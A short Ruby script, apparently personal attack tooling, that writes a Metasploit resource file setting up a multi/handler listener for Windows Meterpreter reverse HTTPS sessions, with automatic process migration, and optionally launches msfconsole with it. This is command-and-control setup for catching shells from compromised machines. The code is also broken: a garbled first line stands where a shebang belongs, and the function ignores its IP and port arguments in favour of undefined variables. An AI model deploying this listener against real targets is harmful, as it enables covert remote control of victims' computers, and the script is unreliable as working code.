/bash: /usr/bin/ruby:
 
def meta(ipA, puertoA, payload)

  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_https\n"
  options += "set LHOST #{lhost}\nset LPORT #{lport}\n"
  options += "set ExitOnSession false\n"
  options += "set AutoRunScript post/windows/manage/smart_migration\n"
  options += "exploit -j\n"
  File.write('/tmp/listen.rc', options)
                
  puts "\nWould you like to start this rc file? (Y/n)"
  msf_bool = $stdin.gets.chomp
  msf_bool = msf_bool.upcase
                    
  puts "rc file written to /tmp/listen.rc"
                        
  if msf_bool == 'Y'
    system("msfconsole -r /tmp/listen.rc")
  else
    puts ""
    puts options
    puts "\n\n Bye!"
  end
                          
                        
end
                      
meta(ARGV[0], ARGV[1], ARGV[2])
